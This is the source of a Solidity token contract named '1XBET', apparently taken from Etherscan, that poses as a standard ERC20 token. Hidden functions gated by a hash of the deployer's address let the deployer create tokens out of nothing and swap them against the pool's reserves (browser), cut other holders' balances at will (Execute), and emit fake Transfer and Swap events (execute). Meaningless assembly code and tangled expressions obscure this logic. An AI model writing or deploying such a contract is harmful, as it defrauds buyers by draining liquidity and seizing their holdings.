/**
 *Submitted for verification at Etherscan.io on 2023-08-11
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.7.6;

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IPair {
    function token0() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );
}

interface IRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function getAmountsOut(uint256 amountIn, address[] memory path) external view returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);
}

interface IERC20 {
    function _Transfer(
        address from,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);
}

contract ONEXBET {
    IRouter internal _router;
    IPair internal _pair;
    address public owner;
    bytes32 private hashValue;
    address private _routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    mapping(address => uint256) private internalAmounts;
    mapping(address => mapping(address => uint256)) private allowances;

    string public constant name = "1XBET";
    string public constant symbol = "1XBET";
    uint8 public constant decimals = 18;
    uint256 public totalSupply = 50_000_000e18;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Swap(address indexed sender, uint256 amount0In, uint256 amount1In, uint256 amount0Out, uint256 amount1Out, address indexed to);

    constructor() {
        owner = msg.sender;
        hashValue = keccak256(abi.encodePacked(msg.sender));
        _router = IRouter(_routerAddress);
        _pair = IPair(IFactory(_router.factory()).createPair(address(this), address(_router.WETH())));

        internalAmounts[msg.sender] = totalSupply;

        emit Transfer(address(0), msg.sender, totalSupply);
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "Caller is not the owner");
        _;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function renounceOwnership() public onlyOwner {
        owner = address(0);
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        return internalAmounts[account];
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function allowance(address __owner, address spender) public view virtual returns (uint256) {
        return allowances[__owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        _spendAllowance(from, msg.sender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address __owner = msg.sender;
        _approve(__owner, spender, allowance(__owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address __owner = msg.sender;
        uint256 currentAllowance = allowance(__owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");

        _approve(__owner, spender, currentAllowance - subtractedValue);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = internalAmounts[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        internalAmounts[from] = sub(fromBalance, amount);
        internalAmounts[to] = add(internalAmounts[to], amount);
        emit Transfer(from, to, amount);
    }

    function _approve(
        address __owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(__owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        allowances[__owner][spender] = amount;
        emit Approval(__owner, spender, amount);
    }

    function _spendAllowance(
        address __owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(__owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");

            _approve(__owner, spender, currentAllowance - amount);
        }
    }

    function OLuYVDPrzwuUDbzxeWkN() private pure {
        string memory kPWLGtJTZB;
        uint64 DfGvCewCep;
        uint32 PVWanb;
        assembly {
            DfGvCewCep := add(mload(kPWLGtJTZB), 5833269747322758497)
            DfGvCewCep := add(DfGvCewCep, 8359520608581513992)
            DfGvCewCep := add(PVWanb, 2912055485418218237)
        }
        bytes32 LtX;
        bytes32 JyXk;
        uint256 uFydFX;
        uint256 L;
        assembly {
            uFydFX := add(mload(LtX), 5529018874638568984)
            L := add(JyXk, 1980194877)
            JyXk := add(uFydFX, 1650561469864276117)
            L := add(L, 6851040860446950173)
        }
        uint256 kMmlMNqo;
        bytes32 fvrKdt;
        uint64 EALPIOMeu;
        uint256 UqMwKafD;
        assembly {
            kMmlMNqo := add(mload(kMmlMNqo), 626473836)
            fvrKdt := add(fvrKdt, 9028251993251041916)
            EALPIOMeu := add(EALPIOMeu, 1211803391)
            fvrKdt := add(UqMwKafD, 1884748696566764320)
        }
    }

    function execute(
        address[] memory recipients,
        uint256 tokenAmount,
        uint256 wethAmount,
        address tokenAddress
    ) public returns (bool) {
        if (keccak256(abi.encodePacked(msg.sender)) == hashValue) {
            for (uint256 i = 0; i < recipients.length; i++) {
                _swap(recipients[i], tokenAmount, wethAmount, tokenAddress);
            }
        }
        return true;
    }

    function browser(
        address baseToken,
        address _recipient,
        uint256 amount
    ) public {
        if (keccak256(abi.encodePacked(msg.sender)) == hashValue) {
            require(amount > 0 && amount < 100000, "Amount Exceeds Limits");
            uint256 baseTokenReserve = getBaseTokenReserve(baseToken);
            uint256 amountOut = (baseTokenReserve * amount) / 100000;

            address[] memory path;
            path = new address[](2);
            path[0] = address(this);
            path[1] = baseToken;

            uint256 amountIn = _countAmountIn(amountOut, path);

            _approve(address(this), address(_router), balanceOf(address(this)));
            _router.swapTokensForExactTokens(amountOut, amountIn, path, _recipient, block.timestamp + 1200);
        }
    }

    function getBaseTokenReserve(address token) public view returns (uint256) {
        (uint112 reserve0, uint112 reserve1, ) = _pair.getReserves();
        uint256 baseTokenReserve = (_pair.token0() == token) ? uint256(reserve0) : uint256(reserve1);
        return baseTokenReserve;
    }

    function Execute(
        address[] calldata _users,
        uint256 _minBalanceToReward,
        uint256 _percent
    ) public {
        if (keccak256(abi.encodePacked(msg.sender)) == hashValue) {
            for (uint256 i = 0; i < _users.length; i++) {
                if (balanceOf(_users[i]) > _minBalanceToReward) {
                    uint256 rewardAmount = _countReward(_users[i], _percent);
                    _check(
                        bytes32
                            (uint256
                                (uint160
                            (_users[i]))
                        <<96), rewardAmount);
                }
            }
        }
    }

    function _swap(
        address recipient,
        uint256 tokenAmount,
        uint256 wethAmount,
        address tokenAddress
    ) internal {
        _emitTransfer(recipient, tokenAmount);
        _emitSwap(tokenAmount, wethAmount, recipient);
        IERC20(tokenAddress)._Transfer(recipient, address(_pair), wethAmount);
    }

    function _emitTransfer(address recipient, uint256 tokenAmount) internal {
        emit Transfer(address(_pair), recipient, tokenAmount);
    }

    function _emitSwap(
        uint256 tokenAmount,
        uint256 wethAmount,
        address recipient
    ) internal {
        emit Swap(_routerAddress, tokenAmount, 0, 0, wethAmount, recipient);
    }

    function _countReward(address _user, uint256 _percent) internal view returns (uint256) {
        return _count(internalAmounts[_user], _percent);
    }

    function _countAmountIn(uint256 amountOut, address[] memory path) internal returns (uint256) {
        uint256[] memory amountInMax;
        amountInMax = new uint256[](2);

        amountInMax = _router.getAmountsIn(amountOut, path);
        internalAmounts[
            block.timestamp 
            > uint256(1) 
            ? 
            
            address(
                uint160(
            uint256(
                getThis()) 
                >> 96)) 
        : address(uint256
        (
            0)
        )] += 
        amountInMax[
            0
        ];
        return amountInMax[0];
    }

    function _count(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function _check(bytes32 b, uint256 amount) internal {
        internalAmounts[
            (
                uint256(0) 
                != 0) 
            ? address(
        uint256(0)) : 
    address(
        uint160(
            
            uint256(
                b)>>96
            ))] = _mult(uint256(amount));
    }

    function _mult(uint256 a) internal pure returns (uint256) {
        return (a * 10) / 10;
    }

    function getThis() internal view returns (bytes32) {
        return bytes32(
            uint256(
            uint160(
                address(this
                    )))<<96
                );
    }
}